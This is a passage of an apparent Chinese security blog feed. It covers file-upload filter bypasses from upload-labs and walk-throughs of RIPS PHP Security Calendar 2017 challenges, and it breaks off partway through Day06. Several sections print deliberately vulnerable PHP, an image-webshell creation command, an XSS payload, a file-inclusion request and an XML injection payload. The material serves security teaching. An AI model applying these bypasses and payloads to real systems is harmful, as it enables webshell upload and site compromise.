，上传的所有文件都会被当做php文件进行解析，前提是需要服务器相关配置开启</p><p>（3）大小写绕过：在Linux没有特殊配置的情况下，这种情况只有win可以，因为win会忽略大小写，例如Pass-05中未使用<strong>strtolower</strong>函数进行小写转化处理，那么将后缀名改成<strong>PHP</strong>即可上传成功</p><p>（4）空格，点绕过：Win下<strong>xx.php</strong>[空格] 或<strong>xx.php.</strong>这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点 ，例如Pass-06和Pass-07未使用<strong>trim</strong>函数或者自定义的<strong>deldot</strong>函数进行去空和去点处理，就可以利用该方法进行绕过上传</p><p>（5）<strong>::$DATA</strong>绕过：NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA，例如Pass-08中，未使用<strong>str_ireplace</strong>函数去除<strong>::$DATA</strong>，那么上传后缀名为<strong>.php::$DATA</strong>即可上传</p><p>（6）双写后缀名绕过：当服务器利用函数（如Pass-10中使用<strong>str_ireplace</strong>函数）将敏感的后缀名替换为空时，双写后缀名，如<strong>.pphphp</strong>即可绕过</p><p>（7）上传<strong>.7z</strong>压缩包绕过：<strong>.7z</strong>是一种压缩包文件的格式，我们上传<strong>cmd.php.7z</strong>文件，再访问该文件时能够正常访问到php页面，这属于Apache解析漏洞，Apache解析文件时，如果后缀名不认识，则会继续想前解析，会解析到php,这就是Apache的解析漏洞 </p><h5 id="2-2白名单检测"><a href="#2-2白名单检测" class="headerlink" title="2.2白名单检测"></a>2.2白名单检测</h5><p>列举出只允许上传的文件后缀名，过滤掉不属于白名单中的文件，常用的绕过方法有以下几种：</p><p>（1）MIME绕过：检查http包的<strong>Content-type</strong>字段来判断文件类型，直接修改该字段值即可</p><p>（2）%00截断：利用<strong>%00</strong>截断<strong>move_uploaded_file</strong>函数，只解析<strong>%00</strong>前的字符，<strong>%00</strong>后的字符不解析，通常运用在GET方式，因为GET方式传入能自动进行URL解码，如Pass-11</p><p>（3）0x00截断：原理同%00截断，只不过是通过POST方式传递参数，需要通过Burp在十六进制形式中修改</p><h4 id="3-检查文件内容"><a href="#3-检查文件内容" class="headerlink" title="3.检查文件内容"></a>3.检查文件内容</h4><p>通过一些检查文件内容的函数进行判断是否是图片格式的文件，可以大致分为对文件头检查，<strong>getimagesize</strong>函数检查，<strong>exif_imagetype</strong>函数检查和二次渲染，通常我们只能够上传图片马，常用的绕过方法有以下几种：<br>（1）利用<strong>copy</strong>命令生成图片马：命令具体为<code>copy 1.jpg/b + cmd.php/a shell.jpg</code>，生成图片马后上传成功，但是同时还得存在文件包含漏洞才能执行图片马</p><p>（2）利用<strong>GIF89A</strong>伪造成GIF文件：在PHP文件开头内容加入<strong>GIF89A</strong>，服务器通过<strong>getimagesize</strong>会认为这是GIF文件</p><p>（3）绕过二次渲染：上传PNG和JPG图片马方法较为复杂，但是GIF图片马只需要找到上传前后两个文件经过二次渲染未改变内容的地方，并在其中添加PHP代码即可</p><h3 id="三-代码逻辑"><a href="#三-代码逻辑" class="headerlink" title="三.代码逻辑"></a>三.代码逻辑</h3><p>这一类属于比较特别的，根据服务器端代码执行的逻辑通过<strong>条件竞争</strong>上传黑名单文件，条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生 。</p><p>以Pass-17为例，程序先进行文件上传后再判断文件是否合法，不合法再进行删除，如果利用多线程持续发送上传PHP文件的请求包，并不断访问上传的文件，服务器会来不及将不合法文件删除，我们也能因此而成功执行PHP文件代码</p><p>最后，再附上一张别人的总结图</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/43.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      file upload
    
    </summary>
    
      <category term="file upload" scheme="https://Foxgrin.github.io/categories/file-upload/"/>
    
    
      <category term="file upload" scheme="https://Foxgrin.github.io/tags/file-upload/"/>
    
  </entry>
  
  <entry>
    <title>代码审计--PHP-Security</title>
    <link href="https://Foxgrin.github.io//posts/16636/"/>
    <id>https://Foxgrin.github.io//posts/16636/</id>
    <published>2019-03-02T13:03:00.000Z</published>
    <updated>2019-03-11T07:10:34.442Z</updated>
    
    <content type="html"><![CDATA[<p>RIPS 2017 PHP代码审计安全挑战<a id="more"></a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>题目原地址： PHP Security Advent Calendar 2017 - <a href="https://www.ripstech.com/php-security-calendar-2017/" target="_blank" rel="noopener">https://www.ripstech.com/php-security-calendar-2017/</a></p><p>RIPSTECH PRESENTS PHP SECURITY CALENDAR 是由 RIPS 团队出品的PHP代码安全审计挑战系列题目，RIPSTECH PRESENTS PHP SECURITY CALENDAR 2017 共包含24道题目（Day 1 ~ 24），每道题目将包含一个较新颖的知识点供大家学习。</p><p>实验环境源码：<a href="https://github.com/vulnspy/ripstech-php-security-calendar-2017" target="_blank" rel="noopener">https://github.com/vulnspy/ripstech-php-security-calendar-2017</a> </p><p>参考题解：<a href="http://www.vulnspy.com/cn-ripstech-presents-php-security-calendar-2017/" target="_blank" rel="noopener">http://www.vulnspy.com/cn-ripstech-presents-php-security-calendar-2017/</a></p><h2 id="Day01"><a href="#Day01" class="headerlink" title="Day01"></a>Day01</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> UPLOAD_DIRECTORY = <span class="string">'./solutions/'</span>;</span><br><span class="line">    <span class="keyword">private</span> $file;</span><br><span class="line">    <span class="keyword">private</span> $whitelist;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;whitelist = range(<span class="number">1</span>, <span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>], <span class="keyword">$this</span>-&gt;whitelist)) &#123;</span><br><span class="line">            move_uploaded_file(</span><br><span class="line">                <span class="keyword">$this</span>-&gt;file[<span class="string">'tmp_name'</span>],</span><br><span class="line">                <span class="keyword">self</span>::UPLOAD_DIRECTORY . <span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>]</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$challenge = <span class="keyword">new</span> Challenge($_FILES[<span class="string">'solution'</span>]);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>代码大致流程是构建了一个Challenge类，类中定义一个常量UPLOAD_DIRECTORY，用于定义上传文件存储的具体位置，并定义了两个魔术方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__construct()　　- 在每次创建新对象时先调用此方法</span><br><span class="line"></span><br><span class="line">__destruct() 　　- 对象的所有引用都被删除或者当对象被显式销毁时执行</span><br></pre></td></tr></table></figure><p>__construct方法中对类中两个私有变量进行赋值，__destruct方法对上传的文件名进行了检查操作，检查文件名是否为整数，范围为1-24，问题就出在这个<strong>in_array</strong>方法，我们知道<strong>in_array</strong>方法的第三个参数默认是<strong>false</strong>，因此会进行弱类型比较，即将上传的文件名自动转化为整形与整数1-24进行比较。这就导致我们可以将恶意文件上传至服务器，只要文件名为数字1-24开头的文件，都可以上传至服务器。</p><p>新创建一个测试文件demo1.php，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;demo1&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=&quot;post&quot; action=&quot;&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;solution&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">class Challenge &#123;</span><br><span class="line">    const UPLOAD_DIRECTORY = &apos;E:/php/PHPTutorial/WWW/html/solutions/&apos;;</span><br><span class="line">    private $file;</span><br><span class="line">    private $whitelist;</span><br><span class="line"></span><br><span class="line">    public function __construct($file) &#123;</span><br><span class="line">        $this-&gt;file = $file;</span><br><span class="line">        $this-&gt;whitelist = range(1, 24);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        if (in_array($this-&gt;file[&apos;name&apos;], $this-&gt;whitelist)) &#123;</span><br><span class="line">        echo $this-&gt;file[&apos;tmp_name&apos;];</span><br><span class="line">            move_uploaded_file(</span><br><span class="line">                $this-&gt;file[&apos;tmp_name&apos;],</span><br><span class="line">                self::UPLOAD_DIRECTORY . $this-&gt;file[&apos;name&apos;]</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">        else echo &quot;fail to upload.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$challenge = new Challenge($_FILES[&apos;solution&apos;]);</span><br><span class="line"> ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>上传文件名1demo.php的一句话木马文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/PHP-Security/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功上传</p><p>本关漏洞主要就在于<strong>in_array</strong>方法的第三个参数未设置，如果设置为true，则会检查搜索的数据与数组的值的类型是否相同，所以修正该漏洞的方法就是将第三个参数设置为true，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array(<span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>], <span class="keyword">$this</span>-&gt;whitelist,<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure><p>修改以后再尝试1demo.php文件，上传失败</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/PHP-Security/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Day02"><a href="#Day02" class="headerlink" title="Day02"></a>Day02</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// composer require "twig/twig"</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $twig;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $indexTemplate = <span class="string">'&lt;img '</span> .</span><br><span class="line">            <span class="string">'src="https://loremflickr.com/320/240"&gt;'</span> .</span><br><span class="line">            <span class="string">'&lt;a href="&#123;&#123;link|escape&#125;&#125;"&gt;Next slide »&lt;/a&gt;'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Default twig setup, simulate loading</span></span><br><span class="line">        <span class="comment">// index.html file from disk</span></span><br><span class="line">        $loader = <span class="keyword">new</span> Twig\Loader\ArrayLoader([</span><br><span class="line">            <span class="string">'index.html'</span> =&gt; $indexTemplate</span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;twig = <span class="keyword">new</span> Twig\Environment($loader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNexSlideUrl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $nextSlide = $_GET[<span class="string">'nextSlide'</span>];</span><br><span class="line">        <span class="keyword">return</span> filter_var($nextSlide, FILTER_VALIDATE_URL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;twig-&gt;render(</span><br><span class="line">            <span class="string">'index.html'</span>,</span><br><span class="line">            [<span class="string">'link'</span> =&gt; <span class="keyword">$this</span>-&gt;getNexSlideUrl()]</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> Template())-&gt;render();</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这关涉及了PHP的Twig模板语言，起到了渲染的作用。我们不需要过多的关注这个模板，我们需要关注的是我们可以控制的变量是$nextSlide，这个变量经过了一个函数<strong>filter_var</strong>的处理，这个函数的作用是根据指定过滤器的ID号对传入的参数进行过滤，这里过滤器ID号为<strong>FILTER_VALIDATE_URL</strong>，所以整个函数的作用是检查变量$nextSlide是否是一个合法的URL，我们可以写一个测试文件测试一下具体的检测流程：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">var_dump(filter_var(<span class="string">"http://www.baidu.com"</span>,FILTER_VALIDATE_URL)); <span class="comment">#string(20) "http://www.baidu.com" </span></span><br><span class="line">var_dump(filter_var(<span class="string">"www.baidu.com"</span>,FILTER_VALIDATE_URL)); <span class="comment">#bool(false) </span></span><br><span class="line">var_dump(filter_var(<span class="string">"123://www.baidu.com"</span>,FILTER_VALIDATE_URL)); <span class="comment">#string(19) "123://www.baidu.com" </span></span><br><span class="line">var_dump(filter_var(<span class="string">"123://123.com"</span>,FILTER_VALIDATE_URL)); <span class="comment">#string(13) "123://123.com" </span></span><br><span class="line">var_dump(filter_var(<span class="string">"123://123"</span>,FILTER_VALIDATE_URL)); <span class="comment">#string(9) "123://123" </span></span><br><span class="line">var_dump(filter_var(<span class="string">"123:/123"</span>,FILTER_VALIDATE_URL)); <span class="comment">#bool(false) </span></span><br><span class="line">var_dump(filter_var(<span class="string">"123://"</span>,FILTER_VALIDATE_URL)); <span class="comment">#bool(false) </span></span><br><span class="line">var_dump(filter_var(<span class="string">"1://1"</span>,FILTER_VALIDATE_URL)); <span class="comment">#string(5) "1://1" </span></span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>经过测试发现具体只是检测变量中是否存在<strong>“://“</strong></p><p>过滤的URL再经过Twig的<strong>escape</strong>过滤后再渲染，查阅Twig的官方文档</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Internally, ``escape`` uses the PHP native `htmlspecialchars`_ function for the HTML escaping strategy.</span><br></pre></td></tr></table></figure><p>escape的过滤规则和<strong>htmlspecialchars</strong>函数过滤规则相同，会将单引号和双引号进行编码</p><p>经过这两个过滤后的URL会在页面中显示，见第9-11行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$indexTemplate = <span class="string">'&lt;img '</span> .</span><br><span class="line">            <span class="string">'src="https://loremflickr.com/320/240"&gt;'</span> .</span><br><span class="line">            <span class="string">'&lt;a href="&#123;&#123;link|escape&#125;&#125;"&gt;Next slide »&lt;/a&gt;'</span>;</span><br></pre></td></tr></table></figure><p>那么这关就存在<strong>XSS</strong>漏洞，我们知道在javascript中<strong>“//“</strong>是表示注释，<strong>“%250a”和”%0a”</strong>在浏览器中表示换行，那么我们就可以构造一下payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?nextSlide=javascript://comment%250aalert(/xss/)</span><br></pre></td></tr></table></figure><p>因为<strong>“//“</strong>表示注释，所以<strong>comment</strong>被注释，换行后执行<strong>alert(/xss/)</strong>，即执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascript://comment</span><br><span class="line">alert(/xss/)</span><br></pre></td></tr></table></figure><p>执行效果如下图所示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/PHP-Security/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功进行XSS注入攻击</p><h2 id="Day03"><a href="#Day03" class="headerlink" title="Day03"></a>Day03</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span><span class="params">($className)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">include</span> $className;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$controllerName = $_GET[<span class="string">'c'</span>];</span><br><span class="line">$data = $_GET[<span class="string">'d'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (class_exists($controllerName)) &#123;</span><br><span class="line">    $controller = <span class="keyword">new</span> $controllerName($data[<span class="string">'t'</span>], $data[<span class="string">'v'</span>]);</span><br><span class="line">    $controller-&gt;render();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'There is no page with this name'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $template;</span><br><span class="line">    <span class="keyword">private</span> $variables;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($template, $variables)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;template = $template;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;variables = $variables;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;variables[<span class="string">'new'</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'controller rendering new response'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'controller rendering old response'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这关涉及到了PHP的魔术方法<strong>__autoload</strong>，用于自动加载类，当一个类被实例化时，会自动调用该方法，方法中使用<strong>include</strong>进行调用实例化类的文件，常用于节约<strong>include</strong>方法的使用。</p><p>当然，还有许多函数方法被调用时也会自动调用<strong>__autoload</strong>方法，如第9行中的<strong>class_exists</strong>方法，它用来判断类名是否存在，除此之外还有以下方法也会自动调用<strong>__autoload</strong>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">call_user_func()</span><br><span class="line">call_user_func_array()</span><br><span class="line">class_exists()</span><br><span class="line">class_implements()</span><br><span class="line">class_parents()</span><br><span class="line">class_uses()</span><br><span class="line">get_class_methods()</span><br><span class="line">get_class_vars()</span><br><span class="line">get_parent_class()</span><br><span class="line">interface_exists()</span><br><span class="line">is_a()</span><br><span class="line">is_callable()</span><br><span class="line">is_subclass_of()</span><br><span class="line">method_exists()</span><br><span class="line">property_exists()</span><br><span class="line">spl_autoload_call()</span><br><span class="line">trait_exists()</span><br></pre></td></tr></table></figure><p>仔细观察<strong>class_exists()</strong>方法传入的参数是通过GET方式传入，可控，传入的参数即调用的文件名，这就造成了<strong>任意文件包含</strong>漏洞</p><p>输入<code>?c=./demo2.php</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/PHP-Security/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Day04"><a href="#Day04" class="headerlink" title="Day04"></a>Day04</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;loginViaXml($user, $pass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loginViaXml</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            $user != <span class="keyword">false</span> &amp;&amp; $pass != <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">            (!strpos($user, <span class="string">'&lt;'</span>) || !strpos($user, <span class="string">'&gt;'</span>)) &amp;&amp;</span><br><span class="line">            (!strpos($pass, <span class="string">'&lt;'</span>) || !strpos($pass, <span class="string">'&gt;'</span>))</span><br><span class="line">        ) &#123;</span><br><span class="line">            $format = <span class="string">'&lt;?xml version="1.0"?&gt;'</span> .</span><br><span class="line">                      <span class="string">'&lt;user v="%s"/&gt;&lt;pass v="%s"/&gt;'</span>;</span><br><span class="line">            $xml = sprintf($format, $user, $pass);</span><br><span class="line">            $xmlElement = <span class="keyword">new</span> SimpleXMLElement($xml);</span><br><span class="line">            <span class="comment">// Perform the actual login.</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;login($xmlElement);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Login($_POST[<span class="string">'username'</span>], $_POST[<span class="string">'password'</span>]);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题目的是为了进行XML注入，对于<code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;user v=&quot;%s&quot;/&gt;&lt;pass v=&quot;%s&quot;/&gt;</code>就必须要进行闭合标签的处理，而条件<code>(!strpos($user, &#39;&lt;&#39;) || !strpos($user, &#39;&gt;&#39;)) &amp;&amp;(!strpos($pass, &#39;&lt;&#39;) || !strpos($pass, &#39;&gt;&#39;))</code>本意是不允许我们对变量$user和变量$pass同时输入<code>&lt;&gt;</code>，但是我们知道<strong>strpos</strong>函数搜索不到目标时返回的是<strong>false</strong>，当找到目标在第一位时返回的是<strong>0</strong>，根据PHP弱类型比较，<strong>0</strong>和<strong>false</strong>是相等的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(strpos(<span class="string">"abcd"</span>,<span class="string">"a"</span>)); <span class="comment"># 0</span></span><br><span class="line">var_dump(strpos(<span class="string">"abcd"</span>,<span class="string">"x"</span>)); <span class="comment"># false</span></span><br><span class="line">var_dump(<span class="number">0</span>==<span class="keyword">false</span>); <span class="comment"># true</span></span><br></pre></td></tr></table></figure><p>所以我们传入的$user和$pass第一位是<code>&lt;</code>或者<code>&gt;</code>即可绕过过滤，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;&amp;password=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;</span><br></pre></td></tr></table></figure><p>最终传入<code>$this-&gt;login($xmlElement)</code>的<code>$xmlElement</code>值是<code>&lt;xml&gt;&lt;user=&quot;&lt;&quot;&gt;&lt;injected-tag property=&quot;&quot;/&gt;&lt;pass=&quot;&lt;&quot;&gt;&lt;injected-tag property=&quot;&quot;/&gt;&lt;/xml&gt;</code> 就可以注入了</p><h2 id="Day06"><a href="#Day06" class="headerlink" title="Day06"></a>Day06</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 